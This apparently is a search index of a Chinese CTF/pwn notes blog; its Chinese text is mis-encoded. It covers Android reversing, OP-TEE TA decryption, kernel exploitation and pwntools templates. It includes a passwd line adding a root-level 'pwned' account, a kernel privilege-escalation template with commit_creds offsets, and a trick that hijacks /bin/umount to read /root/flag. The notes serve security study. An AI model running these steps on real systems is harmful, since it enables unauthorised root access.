[{"categories":["pwn"],"content":"adb adb devices # æŸ¥çœ‹è®¾å¤‡ adb shell ","date":"2024-02-19","objectID":"/apk/:1:0","tags":["adb"],"title":"Apkæ‚è®°","uri":"/apk/"},{"categories":["pwn"],"content":"idaè°ƒè¯•so ä¸€èˆ¬æ–­åœ¨Jni_onload adb forward tcp:23946 tcp:23946 adb shell cd /data/local/tmp ./androidserver androidserverçš„ä½æ•°åº”è¯¥å’Œsoå¯¹åº”ï¼Œä¸è¿‡è·‘ä»¥ä¸‹çœ‹èƒ½ä¸èƒ½æœåˆ°è¿›ç¨‹å°±çŸ¥é“äº†ã€‚ idaä¾§é€‰æ‹©Debugger-\u003eattach-\u003eRemote ARM Linux/Android debuggerï¼Œé€‰æ‹©attachï¼Œæ‰¾åˆ°appè¿›ç¨‹attachä¸Šå°±è¡Œã€‚ ","date":"2024-02-19","objectID":"/apk/:2:0","tags":["adb"],"title":"Apkæ‚è®°","uri":"/apk/"},{"categories":["pwn"],"content":"jdwp am start -D -n com.bin.MathGame/.MainActivity åœ¨æ‰‹æœºä¸Šæ‰§è¡Œ ps -ef | grep mathgame # getpid adb forward tcp:8700 jdwp:{pid} jdb -connect â€œcom.sun.jdi.SocketAttach:hostname=127.0.0.1,port=8700â€ ","date":"2024-02-19","objectID":"/apk/:3:0","tags":["adb"],"title":"Apkæ‚è®°","uri":"/apk/"},{"categories":["pwn"],"content":"jeb https://bbs.pediy.com/thread-268316.htm ","date":"2024-02-19","objectID":"/apk/:4:0","tags":["adb"],"title":"Apkæ‚è®°","uri":"/apk/"},{"categories":["pwn"],"content":"frida ","date":"2024-02-19","objectID":"/apk/:5:0","tags":["adb"],"title":"Apkæ‚è®°","uri":"/apk/"},{"categories":["pwn"],"content":"frida-hexdump ç”¨æ¥dumpè¿è¡Œæ—¶çš„dexï¼Œå¸¸ç”¨äºè„±å£³ã€‚ pip3 install frida-dexdump adb forward tcp:27042 tcp:27042 adb forward tcp:27043 tcp:27043 # è¿è¡Œapp frida-dexdump -FU ä½¿ç”¨d2j_dex2jaråç¼–è¯‘ï¼Œç„¶åæ‹–å…¥jadxåˆ†æã€‚ ","date":"2024-02-19","objectID":"/apk/:5:1","tags":["adb"],"title":"Apkæ‚è®°","uri":"/apk/"},{"categories":["pwn"],"content":"frida_hook_libart https://github.com/lasting-yang/frida_hook_libart å¯ä»¥æŸ¥çœ‹åŠ¨æ€æ³¨å†Œçš„jni_onload frida -U -f package_name -l hook_RegisterNatives.js ","date":"2024-02-19","objectID":"/apk/:6:0","tags":["adb"],"title":"Apkæ‚è®°","uri":"/apk/"},{"categories":["tee"],"content":"ta //------------------------------------------------ //--- 010 Editor v10.0.2 Binary Template // // File: // Authors: // Version: // Purpose: // Category: // File Mask: // ID Bytes: // History: //------------------------------------------------ #define TEE_FS_HTREE_IV_SIZE 16 #define TEE_FS_HTREE_TAG_SIZE 16 #define TEE_FS_HTREE_FEK_SIZE 16 typedef struct _tee_fs_htree_meta { UINT64 length; }tee_fs_htree_meta; typedef struct _tee_fs_htree_imeta { struct tee_fs_htree_meta meta; UINT32 max_node_id; UINT32 nop; }tee_fs_htree_imeta; typedef struct _tee_fs_htree_image { UCHAR iv[TEE_FS_HTREE_IV_SIZE]; UCHAR tag[TEE_FS_HTREE_TAG_SIZE]; UCHAR enc_fek[TEE_FS_HTREE_FEK_SIZE]; UCHAR imeta[sizeof(struct tee_fs_htree_imeta)]; UINT32 counter; }tee_fs_htree_image; #define TEE_FS_HTREE_HASH_SIZE 32 #define TEE_FS_HTREE_IV_SIZE 16 #define TEE_FS_HTREE_TAG_SIZE 16 typedef struct _tee_fs_htree_node_image { /* Note that calc_node_hash() depends on hash first in struct */ UCHAR hash[TEE_FS_HTREE_HASH_SIZE]; UCHAR iv[TEE_FS_HTREE_IV_SIZE]; UCHAR tag[TEE_FS_HTREE_TAG_SIZE]; USHORT flags; }tee_fs_htree_node_image; //-------------------------------------- LittleEndian(); tee_fs_htree_image ver0_head; tee_fs_htree_image ver1_head; FSeek(0x1000); tee_fs_htree_node_image ver0_root_node; tee_fs_htree_node_image ver1_root_node; FSeek(0x2000); ","date":"2023-09-25","objectID":"/optee_template/:1:0","tags":["tee","optee"],"title":"Optee_template","uri":"/optee_template/"},{"categories":["tee"],"content":"encrypted ta //------------------------------------------------ //--- 010 Editor v10.0.2 Binary Template // // File: // Authors: // Version: // Purpose: // Category: // File Mask: // ID Bytes: // History: //------------------------------------------------ enum shdr_img_type { SHDR_TA = 0, SHDR_BOOTSTRAP_TA = 1, SHDR_ENCRYPTED_TA = 2, }; #define SHDR_MAGIC 0x4f545348 /** * struct shdr - signed header * @magic: magic number must match SHDR_MAGIC * @img_type: image type, values defined by enum shdr_img_type * @img_size: image size in bytes * @algo: algorithm, defined by public key algorithms TEE_ALG_* * from TEE Internal API specification * @hash_size: size of the signed hash * @sig_size: size of the signature * @hash: hash of an image * @sig: signature of @hash */ struct shdr { UINT32 magic; UINT32 img_type; UINT32 img_size; UINT32 algo; USHORT hash_size; USHORT sig_size; /* * Commented out element used to visualize the layout dynamic part * of the struct. * * hash is accessed through the macro SHDR_GET_HASH and * signature is accessed through the macro SHDR_GET_SIG * * UCHAR hash[hash_size]; * UCHAR sig[sig_size]; */ }; /** * struct shdr_bootstrap_ta - bootstrap TA subheader * @uuid: UUID of the TA * @ta_version: Version of the TA */ struct shdr_bootstrap_ta { UCHAR uuid[16]; UINT32 ta_version; }; /** * struct shdr_encrypted_ta - encrypted TA header * @enc_algo: authenticated encyption algorithm, defined by symmetric key * algorithms TEE_ALG_* from TEE Internal API * specification * @flags: authenticated encyption flags * @iv_size: size of the initialization vector * @tag_size: size of the authentication tag * @iv: initialization vector * @tag: authentication tag */ struct shdr_encrypted_ta { UINT32 enc_algo; UINT32 flags; USHORT iv_size; USHORT tag_size; /* * Commented out element used to visualize the layout dynamic part * of the struct. * * iv is accessed through the macro SHDR_ENC_GET_IV and * tag is accessed through the macro SHDR_ENC_GET_TAG * * UCHAR iv[iv_size]; * UCHAR tag[tag_size]; */ }; #define SHDR_ENC_KEY_TYPE_MASK 0x1 enum shdr_enc_key_type { SHDR_ENC_KEY_DEV_SPECIFIC = 0, SHDR_ENC_KEY_CLASS_WIDE = 1, }; #define HASH_SIZE 32 #define TAG_SIZE 16 #define SIG_SIZE 256 #define IV_SIZE 12 /* nonce = \u003cunique random value\u003e ciphertext, tag = AES_GCM(\u003cstripped ELF\u003e) hash = H(\u003cstruct shdr\u003e || \u003cstruct shdr_bootstrap_ta\u003e || \u003cstruct shdr_encrypted_ta\u003e || \u003cnonce\u003e || \u003ctag\u003e || \u003cstripped ELF\u003e) signature = RSA-Sign(\u003chash\u003e) encrypted_binary = \u003cstruct shdr\u003e || \u003chash\u003e || \u003csignature\u003e || \u003cstruct shdr_bootstrap_ta\u003e || \u003cstruct shdr_encrypted_ta\u003e || \u003cnonce\u003e || \u003ctag\u003e || \u003cciphertext\u003e */ LittleEndian(); shdr head_shdr; UCHAR hash[HASH_SIZE]; UCHAR sig[SIG_SIZE]; shdr_bootstrap_ta bootstrap_ta; shdr_encrypted_ta encrypted_ta; UCHAR nonce[IV_SIZE]; UCHAR tag[TAG_SIZE]; ","date":"2023-09-25","objectID":"/optee_template/:2:0","tags":["tee","optee"],"title":"Optee_template","uri":"/optee_template/"},{"categories":["tee"],"content":"decrypt script from cryptography.hazmat.primitives.ciphers.aead import AESGCM import struct import sys f = open(sys.argv[1], 'rb') shdr = f.read(20) (magic, img_type, img_size, algo, digest_len, sig_len) = struct.unpack('\u003cIIIIHH', shdr) # private key key = 'b64d239b1f3c7d3b06506229cd8ff7c8af2bb4db2168621ac62c84948468c4f4' # hash = f.read(32) sig = f.read(256) shdr_bootstrap_ta = f.read(20) shdr_encrypted_ta = f.read(12) nonce = f.read(12) tag = f.read(16) cipher = f.read() print(len(cipher)) f.close() print(f\"nonce: {nonce}\") print(f\"tag: {tag}\") gcm = AESGCM(bytes.fromhex(key)) plain = gcm.decrypt(nonce, cipher+tag, None) f = open('dec.ta', 'wb') f.write(plain) f.close() ","date":"2023-09-25","objectID":"/optee_template/:3:0","tags":["tee","optee"],"title":"Optee_template","uri":"/optee_template/"},{"categories":["tee"],"content":"ida typedef unsigned int size_t; enum TEEC_ParamType { TEEC_NONE = 0x0, /* unused parameter */ TEEC_VALUE_INPUT = 0x01, /* input type of value, refer TEEC_Value */ TEEC_VALUE_OUTPUT = 0x02, /* output type of value, refer TEEC_Value */ TEEC_VALUE_INOUT = 0x03, /* value is used as both input and output, refer TEEC_Value */ TEEC_MEMREF_TEMP_INPUT = 0x05, /* input type of temp memory reference, refer TEEC_TempMemoryReference */ TEEC_MEMREF_TEMP_OUTPUT = 0x06, /* output type of temp memory reference, refer TEEC_TempMemoryReference */ TEEC_MEMREF_TEMP_INOUT = 0x07, /* temp memory reference used as both input and output, refer TEEC_TempMemoryReference */ TEEC_ION_INPUT = 0x08, /* input type of icon memory reference, refer TEEC_IonReference */ TEEC_ION_SGLIST_INPUT = 0x09, /* input type of ion memory block reference, refer TEEC_IonSglistReference */ TEEC_MEMREF_SHARED_INOUT = 0x0a, /* no copy mem */ TEEC_MEMREF_WHOLE = 0xc, /* use whole memory block, refer TEEC_RegisteredMemoryReference */ TEEC_MEMREF_PARTIAL_INPUT = 0xd, /* input type of memory reference, refer TEEC_RegisteredMemoryReference */ TEEC_MEMREF_PARTIAL_OUTPUT = 0xe, /* output type of memory reference, refer TEEC_RegisteredMemoryReference */ TEEC_MEMREF_PARTIAL_INOUT = 0xf /* memory reference used as both input and output, refer TEEC_RegisteredMemoryReference */ }; struct TEE_VALUE_Param { size_t a; size_t b; }; struct TEE_MEMREF_Param { void *buffer; size_t size; }; union TEE_Param { struct TEE_VALUE_Param value; struct TEE_MEMREF_Param memref; }; ","date":"2023-09-25","objectID":"/optee_template/:4:0","tags":["tee","optee"],"title":"Optee_template","uri":"/optee_template/"},{"categories":["pwn"],"content":"kallsyms import idc import ida_funcs import ida_kernwin ksyms = open(\"/path/to/kallsyms.txt\") for line in ksyms: addr = int(line[0:16],16) name = line[19:].replace('_','') name = line[19:].replace('\\n','') idc.create_insn(addr) ida_funcs.add_func(addr) idc.set_name(addr,name) ida_kernwin.msg(\"%08X:%s\"%(addr,name)) ","date":"2023-09-25","objectID":"/kernel/:1:0","tags":["pwn","kernel"],"title":"Kernel","uri":"/kernel/"},{"categories":["pwn"],"content":"passwd pwned:$1$aa$Sc4m1DBsyHWbRbwmIbGHq1:0:0:/root:/root:/bin/sh # å¯†ç ï¼šlol ","date":"2023-09-25","objectID":"/kernel/:2:0","tags":["pwn","kernel"],"title":"Kernel","uri":"/kernel/"},{"categories":["pwn"],"content":"cpio gcc -o exp -static exp.c -masm=intel -s -lpthread mv ./exp ./initramfs cd initramfs find . -print0 \\ | cpio --null -ov --format=newc \\ | gzip -9 \u003e ../initramfs.cpio.gz cd .. ","date":"2023-09-25","objectID":"/kernel/:3:0","tags":["pwn","kernel"],"title":"Kernel","uri":"/kernel/"},{"categories":["pwn"],"content":"mount # ext4 sudo mount -o rw -osync -o auto -o exec rootfs.img rootfs ","date":"2023-09-25","objectID":"/kernel/:4:0","tags":["pwn","kernel"],"title":"Kernel","uri":"/kernel/"},{"categories":["pwn"],"content":"æ¨¡æ¿ #define _GNU_SOURCE #include \u003cassert.h\u003e #include \u003cfcntl.h\u003e #include \u003cpoll.h\u003e #include \u003csched.h\u003e #include \u003csignal.h\u003e #include \u003cstdbool.h\u003e #include \u003cstdint.h\u003e #include \u003cstdio.h\u003e #include \u003cstdlib.h\u003e #include \u003cstring.h\u003e #include \u003csys/ioctl.h\u003e #include \u003csys/mman.h\u003e #include \u003csys/prctl.h\u003e #include \u003csys/ptrace.h\u003e #include \u003csys/stat.h\u003e #include \u003csys/types.h\u003e #include \u003csys/user.h\u003e #include \u003csys/utsname.h\u003e #include \u003csys/wait.h\u003e #include \u003csyscall.h\u003e #include \u003cunistd.h\u003e #define COLOR_GREEN \"\\033[32m\" #define COLOR_RED \"\\033[31m\" #define COLOR_YELLOW \"\\033[33m\" #define COLOR_DEFAULT \"\\033[0m\" #define logd(fmt, ...) \\ dprintf(2, \"[*] %s:%d \" fmt \"\\n\", __FILE__, __LINE__, ##__VA_ARGS__) #define logi(fmt, ...) \\ dprintf(2, COLOR_GREEN \"[+] %s:%d \" fmt \"\\n\" COLOR_DEFAULT, __FILE__, \\ __LINE__, ##__VA_ARGS__) #define logw(fmt, ...) \\ dprintf(2, COLOR_YELLOW \"[!] %s:%d \" fmt \"\\n\" COLOR_DEFAULT, __FILE__, \\ __LINE__, ##__VA_ARGS__) #define loge(fmt, ...) \\ dprintf(2, COLOR_RED \"[-] %s:%d \" fmt \"\\n\" COLOR_DEFAULT, __FILE__, \\ __LINE__, ##__VA_ARGS__) #define die(fmt, ...) \\ do { \\ loge(fmt, ##__VA_ARGS__); \\ loge(\"Exit at line %d\", __LINE__); \\ exit(1); \\ } while (0) #define o(x) (kbase + x) size_t pop_rdi = 0x2c9d; size_t commit_creds = 0xbb5b0; size_t init_cred = 0x1a4cbf8; size_t swapgs_restore_regs_and_return_to_usermode = 0x1000f01; size_t prepare_kernel_cred = 0xf8520; unsigned long user_cs, user_ss, user_eflags, user_sp, user_ip; void get_shell() { int uid; if (!(uid = getuid())) { logi(\"root get!!\"); execl(\"/bin/sh\", \"sh\", NULL); } else { die(\"gain root failed, uid: %d\", uid); } } void saveStatus(void) { __asm__(\"mov user_cs, cs;\" \"mov user_ss, ss;\" \"mov user_sp, rsp;\" \"pushf;\" \"pop user_eflags;\" ); user_ip = (uint64_t)\u0026get_shell; user_sp = 0xf000 + (uint64_t)mmap(0, 0x10000, 6, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0); } void bind_cpu(int cpu_idx) { cpu_set_t my_set; CPU_ZERO(\u0026my_set); CPU_SET(cpu_idx, \u0026my_set); if (sched_setaffinity(0, sizeof(cpu_set_t), \u0026my_set)) { die(\"sched_setaffinity: %m\"); } } void hexdump(const void *data, size_t size) { char ascii[17]; size_t i, j; ascii[16] = '\\0'; for (i = 0; i \u003c size; ++i) { dprintf(2, \"%02X \", ((unsigned char *)data)[i]); if (((unsigned char *)data)[i] \u003e= ' ' \u0026\u0026 ((unsigned char *)data)[i] \u003c= '~') { ascii[i % 16] = ((unsigned char *)data)[i]; } else { ascii[i % 16] = '.'; } if ((i + 1) % 8 == 0 || i + 1 == size) { dprintf(2, \" \"); if ((i + 1) % 16 == 0) { dprintf(2, \"| %s \\n\", ascii); } else if (i + 1 == size) { ascii[(i + 1) % 16] = '\\0'; if ((i + 1) % 16 \u003c= 8) { dprintf(2, \" \"); } for (j = (i + 1) % 16; j \u003c 16; ++j) { dprintf(2, \" \"); } dprintf(2, \"| %s \\n\", ascii); } } } } size_t kbase; int main() { saveStatus(); int fd = open(\"/dev/seven\", O_RDONLY); if(fd \u003c 0) perror(\"Error open\"); } ","date":"2023-09-25","objectID":"/kernel/:5:0","tags":["pwn","kernel"],"title":"Kernel","uri":"/kernel/"},{"categories":["pwn"],"content":"Codeql for obj import cpp from FunctionCall fc, Function f, int alloc_size, int alloc_flags, PointerType typ where f = fc.getTarget() and // åªæŸ¥æ‰¾kallocå’Œkzallocç±»çš„å‡½æ•° f.getName().regexpMatch(\"k[a-z]*alloc\") and alloc_size = fc.getArgument(0).getValue().toInt() and // get object in kmalloc-64,128,192 (alloc_size \u003e 32 and alloc_size \u003c= 192) and alloc_flags = fc.getArgument(1).getValue().toInt() and // GFP_ACCOUNT == 0x400000(4194304) alloc_flags.bitAnd(4194304) = 0 and typ = fc.getActualType().(PointerType) and not fc.getEnclosingFunction().getFile().getRelativePath().regexpMatch(\"arch.*\") and not fc.getEnclosingFunction().getFile().getRelativePath().regexpMatch(\"drivers.*\") select fc, \"åœ¨ $@ çš„ $@ ä¸­å‘ç°ä¸€å¤„è°ƒç”¨ $@ åˆ†é…å†…å­˜ï¼Œç»“æ„ä½“ $@, å¤§å° \" + alloc_size.toString(), fc,fc.getEnclosingFunction().getFile().getRelativePath(), fc.getEnclosingFunction(), fc.getEnclosingFunction().getName().toString(), fc, f.getName(), typ.getBaseType(), typ.getBaseType().getName() ","date":"2023-09-25","objectID":"/kernel/:6:0","tags":["pwn","kernel"],"title":"Kernel","uri":"/kernel/"},{"categories":["pwn"],"content":"extract-vmlinux #!/bin/sh # SPDX-License-Identifier: GPL-2.0-only # ---------------------------------------------------------------------- # extract-vmlinux - Extract uncompressed vmlinux from a kernel image # # Inspired from extract-ikconfig # (c) 2009,2010 Dick Streefland \u003cdick@streefland.net\u003e # # (c) 2011 Corentin Chary \u003ccorentin.chary@gmail.com\u003e # # ---------------------------------------------------------------------- check_vmlinux() { # Use readelf to check if it's a valid ELF # TODO: find a better to way to check that it's really vmlinux # and not just an elf readelf -h $1 \u003e /dev/null 2\u003e\u00261 || return 1 cat $1 exit 0 } try_decompress() { # The obscure use of the \"tr\" filter is to work around older versions of # \"grep\" that report the byte offset of the line instead of the pattern. # Try to find the header ($1) and decompress from here for pos in `tr \"$1\\n$2\" \"\\n$2=\" \u003c \"$img\" | grep -abo \"^$2\"` do pos=${pos%%:*} tail -c+$pos \"$img\" | $3 \u003e $tmp 2\u003e /dev/null check_vmlinux $tmp done } # Check invocation: me=${0##*/} img=$1 if [ $# -ne 1 -o ! -s \"$img\" ] then echo \"Usage: $me \u003ckernel-image\u003e\" \u003e\u00262 exit 2 fi # Prepare temp files: tmp=$(mktemp /tmp/vmlinux-XXX) trap \"rm -f $tmp\" 0 # That didn't work, so retry after decompression. try_decompress '\\037\\213\\010' xy gunzip try_decompress '\\3757zXZ\\000' abcde unxz try_decompress 'BZh' xy bunzip2 try_decompress '\\135\\0\\0\\0' xxx unlzma try_decompress '\\211\\114\\132' xy 'lzop -d' try_decompress '\\002!L\\030' xxx 'lz4 -d' try_decompress '(\\265/\\375' xxx unzstd # Finally check for uncompressed images or objects: check_vmlinux $img # Bail out: echo \"$me: Cannot find vmlinux.\" \u003e\u00262 ","date":"2023-09-25","objectID":"/kernel/:7:0","tags":["pwn","kernel"],"title":"Kernel","uri":"/kernel/"},{"categories":["pwn"],"content":"éé¢„æœŸ mv bin bin1 /bin1/mkdir bin /bin1/chmod 777 bin /bin1/echo \"/bin1/cat /root/flag\" \u003e /bin/umount /bin1/chmod 777 /bin/umount exit ","date":"2023-09-25","objectID":"/kernel/:8:0","tags":["pwn","kernel"],"title":"Kernel","uri":"/kernel/"},{"categories":["code"],"content":"å‰å‡ å¤©ç¾¤é‡Œæåˆ°çš„é—®é¢˜ï¼Œç®€å•è®°å½•ä¸‹æŸ¥é˜…åˆ°çš„æ–¹æ³•ã€‚ ","date":"2023-09-25","objectID":"/mixed_c_with_asm/:0:0","tags":["c","asm"],"title":"Mixed_c_with_asm","uri":"/mixed_c_with_asm/"},{"categories":["code"],"content":"åœ¨Cä¸­è°ƒç”¨æ±‡ç¼–ä¸­å®šä¹‰çš„å‡½æ•° ä»¥Linux x86ä¸ºä¾‹ï¼Œç”¨æ±‡ç¼–è¯­è¨€ç¼–å†™ä¸€ä¸ªhello_worldå‡½æ•°ï¼Œè¾“å‡ºâ€Hello, World!\\nâ€ä¸ºä¾‹ï¼Œå…¶ä¸éœ€è¦ä»»ä½•å‚æ•°ï¼ŒåŒæ—¶ä¹Ÿæ²¡æœ‰è¿”å›å€¼ï¼Œç›¸åº”çš„æ±‡ç¼–ä»£ç å¦‚ä¸‹ï¼š .globl hello_world .type hello_world, @function .section .data message: .ascii \"Hello, World!\\n\" length: .int . - message .section .text hello_world: mov $4, %eax mov $1, %ebx mov $message, %ecx mov length, %edx int $0x80 ret ç”±äºä½¿ç”¨gccè¿›è¡Œç¼–è¯‘ï¼Œå› æ­¤æ±‡ç¼–ä»£ç ä¸­ä½¿ç”¨AT\u0026Tè¯­æ³•ã€‚å¦‚æœåœ¨ç”¨gccç¼–è¯‘æ—¶åŠ ä¸Š-masm=intel é€‰é¡¹ï¼Œåˆ™å¯ä»¥ä½¿ç”¨intelè¯­æ³•ã€‚å½“ç„¶ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨nasmå¯¹æ±‡ç¼–è¯­è¨€è¿›è¡Œæ±‡ç¼–ã€‚ ç„¶åç¼–å†™ä¸€ä¸ªCç¨‹åºè°ƒç”¨è¯¥å‡½æ•°ï¼Œå¦‚ä¸‹ï¼š // gcc -m32 hello_world.c hello_world.s -o hello_world extern void hello_world(); void main() { hello_world(); } ä¸‹é¢é€šè¿‡å‚æ•°ä¼ é€’å°†â€Hello World!â€ä¼ å…¥åˆ°æ±‡ç¼–ä»£ç ä¸­ï¼Œä¿®æ”¹å¦‚ä¸‹ï¼š .globl hello_world .type hello_world, @function .section .text hello_world: mov $4, %eax mov $1, %ebx mov 4(%esp), %ecx mov $0xd, %edx int $0x80 ret å¯¹åº”çš„Cç¨‹åºå¦‚ä¸‹ï¼š extern void hello_world(char* value); void main() { hello_world(\"Hello World!\\n\"); } ","date":"2023-09-25","objectID":"/mixed_c_with_asm/:1:0","tags":["c","asm"],"title":"Mixed_c_with_asm","uri":"/mixed_c_with_asm/"},{"categories":["code"],"content":"åœ¨æ±‡ç¼–ä¸­è°ƒç”¨Cä¸­çš„å‡½æ•° ä»¥printfä¸ºä¾‹ï¼Œé€šè¿‡åœ¨æ±‡ç¼–ä»£ç ä¸­è°ƒç”¨printf()å‡½æ•°ï¼Œç¤ºä¾‹ä»£ç å¦‚ä¸‹ï¼š .extern printf .globl main .section .data message: .ascii \"hello,world!\\n\" format: .ascii \"%s\" .section .text main: push $message push $format mov $0, %eax call printf add $0x8, %esp ret ä½¿ç”¨gccç¼–è¯‘æ±‡ç¼–ä»£ç æ—¶ï¼Œå¼€å§‹ç¬¦å·ä¸å†æ˜¯_startè€Œæ˜¯mainã€‚ç”±äºmainæ˜¯ä¸€ä¸ªå‡½æ•°ï¼Œæ‰€ä»¥åœ¨æœ€åå¿…é¡»è¦æœ‰retæŒ‡ä»¤ï¼› åœ¨è°ƒç”¨å‡½æ•°ä¹‹å‰ï¼Œå¯„å­˜å™¨eax/raxçš„å€¼å¿…é¡»è®¾ä¸º0ã€‚ ","date":"2023-09-25","objectID":"/mixed_c_with_asm/:1:1","tags":["c","asm"],"title":"Mixed_c_with_asm","uri":"/mixed_c_with_asm/"},{"categories":["code"],"content":"åœ¨Cä¸­åµŒå…¥æ±‡ç¼– #include \u003cstdio.h\u003e int sum(int a, int b) { asm(\"addl %edi, %esi\"); asm(\"movl %esi, %eax\"); } int main() { printf(\"%d\\n\", sum(2, 3)); return 0; } åœ¨ä¸Šé¢çš„ç¤ºä¾‹ä»£ç ä¸­ï¼Œä¹Ÿå¯ä»¥å°†å¤šæ¡æ±‡ç¼–æŒ‡ä»¤å†™åœ¨ä¸€èµ·ï¼Œå¦‚ä¸‹ï¼š asm( \"addl %edi, %esi\\n\\r\" \"movl %esi, %eax\\n\\r\" ); ","date":"2023-09-25","objectID":"/mixed_c_with_asm/:2:0","tags":["c","asm"],"title":"Mixed_c_with_asm","uri":"/mixed_c_with_asm/"},{"categories":["pwn"],"content":"USE ADB in WSL # ADB export PATH=\"$PATH:/mnt/d/Tools/Android/SDK/platform-tools\" alias adb=\"/mnt/d/Tools/Android/SDK/platform-tools/adb.exe\" ç”±äºå°†adbçš„è·¯å¾„aliasåï¼Œé»˜è®¤åœ¨shä¸­æ˜¯æ‰¾ä¸åˆ°çš„ï¼Œè‹¥æƒ³åœ¨shè„šæœ¬ä¸­ä½¿ç”¨ADBï¼Œéœ€åœ¨è„šæœ¬å‰æ·»åŠ ä»¥ä¸‹ä»£ç : #!/bin/bash -i shopt -s expand_aliases ","date":"2023-09-25","objectID":"/adb/:1:0","tags":["adb"],"title":"Adb","uri":"/adb/"},{"categories":["pwn"],"content":"Usage adb push ready_to_push path adb pull path_to_want # if read-only system adb remout ","date":"2023-09-25","objectID":"/adb/:2:0","tags":["adb"],"title":"Adb","uri":"/adb/"},{"categories":["misc"],"content":"exp template from pwn import * import sys context.log_level = \"debug\" if len(sys.argv) \u003c 2: debug = True else: debug = False if debug: p = process(\"./\") libc = ELF(\"/lib/x86_64-linux-gnu/libc.so.6\") else: p = remote(\"\",) libc = ELF(\"./libc-2.31.so\") ru = lambda x : p.recvuntil(x) sn = lambda x : p.send(x) rl = lambda : p.recvline() sl = lambda x : p.sendline(x) rv = lambda x : p.recv(x) sa = lambda a,b : p.sendafter(a,b) sla = lambda a,b : p.sendlineafter(a, b) def debugf(b=0): if debug: if b: gdb.attach(p,\"b *$rebase({b})\".format(b = hex(b))) else: gdb.attach(p) #context.terminal = ['tmux', 'splitw', '-h'] p.interactive() ","date":"2023-09-25","objectID":"/misc/:1:0","tags":["misc"],"title":"Misc","uri":"/misc/"},{"categories":["misc"],"content":"strace/socat strace -fi /bin/socat 8899 ./challenge ","date":"2023-09-25","objectID":"/misc/:2:0","tags":["misc"],"title":"Misc","uri":"/misc/"},{"categories":["misc"],"content":"æŸ¥æ‰¾é”™è¯¯git commit git bisect ","date":"2023-09-25","objectID":"/misc/:3:0","tags":["misc"],"title":"Misc","uri":"/misc/"},{"categories":["misc"],"content":"Debug Multithreading # gdb set follow-fork-mode [parent|child] # è®¾ç½®è°ƒè¯•[çˆ¶è¿›ç¨‹/å­è¿›ç¨‹] set detach-on-fork [on|off] # æœªè°ƒè¯•è¿›ç¨‹[ç»§ç»­æ‰§è¡Œ/blockåœ¨forkä½ç½®] show follow-fork-mode show detach-on-fork info inferiors # æŸ¥çœ‹æ­£åœ¨è°ƒè¯•çš„è¿›ç¨‹ä¿¡æ¯ info threads # æŸ¥è¯¢çº¿ç¨‹ thread \u003cthread number\u003e # åˆ‡æ¢çº¿ç¨‹ strace -ff -o test.txt ./your_binary ","date":"2023-09-25","objectID":"/misc/:4:0","tags":["misc"],"title":"Misc","uri":"/misc/"},{"categories":["misc"],"content":"hex dump void hexdump(const void *data, size_t size) { char ascii[17]; size_t i, j; ascii[16] = '\\0'; for (i = 0; i \u003c size; ++i) { dprintf(2, \"%02X \", ((unsigned char *)data)[i]); if (((unsigned char *)data)[i] \u003e= ' ' \u0026\u0026 ((unsigned char *)data)[i] \u003c= '~') { ascii[i % 16] = ((unsigned char *)data)[i]; } else { ascii[i % 16] = '.'; } if ((i + 1) % 8 == 0 || i + 1 == size) { dprintf(2, \" \"); if ((i + 1) % 16 == 0) { dprintf(2, \"| %s \\n\", ascii); } else if (i + 1 == size) { ascii[(i + 1) % 16] = '\\0'; if ((i + 1) % 16 \u003c= 8) { dprintf(2, \" \"); } for (j = (i + 1) % 16; j \u003c 16; ++j) { dprintf(2, \" \"); } dprintf(2, \"| %s \\n\", ascii); } } } } ","date":"2023-09-25","objectID":"/misc/:5:0","tags":["misc"],"title":"Misc","uri":"/misc/"},{"categories":["misc"],"content":"ropper ropper --file ./vmlinux --nocolor \u003e gadgets.txt ","date":"2023-09-25","objectID":"/misc/:6:0","tags":["misc"],"title":"Misc","uri":"/misc/"},{"categories":["misc"],"content":"pow #include \u003cstdio.h\u003e #include \u003cstring.h\u003e #include \u003cmemory.h\u003e #include \u003cstdint.h\u003e #include \u003copenssl/sha.h\u003e #define PREFIX_LEN 10 int main(int argc, char const *argv[]) { if (argc != 2 || strlen(argv[1]) != PREFIX_LEN) return -1; uint8_t buf[32]; uint8_t out[SHA256_DIGEST_LENGTH]; memcpy(buf, argv[1], PREFIX_LEN); for (uint64_t i = 0; i \u003c 0xffffffffffff; ++i) { sprintf(buf + PREFIX_LEN, \"%lu\", i); SHA256(buf, strlen(buf), out); if (out[0] == 0 \u0026\u0026 out[1] == 0 \u0026\u0026 out[2] == 0 \u0026\u0026 (out[3] \u003e\u003e 5) == 0) { printf(\"%s\\n\", buf+10); break; } } return 0; } // gcc -O2 pow.c -lcrypto \u0026\u0026 ./a.out pzlYZX5ZEb \u0026\u0026 rm ./a.out pow from Crypto.Util.number import getPrime,bytes_to_long from pwn import * import urllib.parse as parse from pwnlib.util.iters import bruteforce from hashlib import sha256 def brute_force(prefix,s): return bruteforce(lambda x:sha256((x+prefix).encode()).hexdigest()==s,string.ascii_letters+string.digits,length=4,method='fixed') p=remote('202.112.238.82', 10010) p.recvuntil(b\"sha256(XXXX+\") prefix = p.recvn(16).decode() p.recvuntil(b\") == \") s = p.recvn(64).decode() log.warning(prefix) log.warning(s) p.sendline(brute_force(prefix,s)) p.interactive() ","date":"2023-09-25","objectID":"/misc/:7:0","tags":["misc"],"title":"Misc","uri":"/misc/"},{"categories":["misc"],"content":"docker docker rm -f `docker ps -a -q` ","date":"2023-09-25","objectID":"/misc/:8:0","tags":["misc"],"title":"Misc","uri":"/misc/"},{"categories":["misc"],"content":"è‡ªå®šä¹‰ä¼ å‚è§„åˆ™ void __usercall xxxxx(char* a1@\u003crdi\u003e) ","date":"2023-09-25","objectID":"/misc/:8:1","tags":["misc"],"title":"Misc","uri":"/misc/"},{"categories":["misc"],"content":"ä¿®æ”¹idaå­—ç¬¦ä¸²æ˜¾ç¤º # puts(aStr) ---\u003e puts(\"str\") change str seg -\u003e r_x ","date":"2023-09-25","objectID":"/misc/:8:2","tags":["misc"],"title":"Misc","uri":"/misc/"},{"categories":["misc"],"content":"musl-gcc for kernel # we cannot compile the exploit using musl-gcc, which produces small binary. The problem is that it seems that musl-gcc cannot find the \u003clinux/xxx.h\u003e header files. I solved this by preprocessing exploit using gcc -E and compiling the preprocessing output using musl-gcc gcc -E exp.c -o fs/exp.c musl-gcc -static fs/exp.c -o fs/exp ","date":"2023-09-25","objectID":"/misc/:9:0","tags":["misc"],"title":"Misc","uri":"/misc/"},{"categories":["misc"],"content":"remote exp upload from pwn import * import base64 context.log_level = \"debug\" 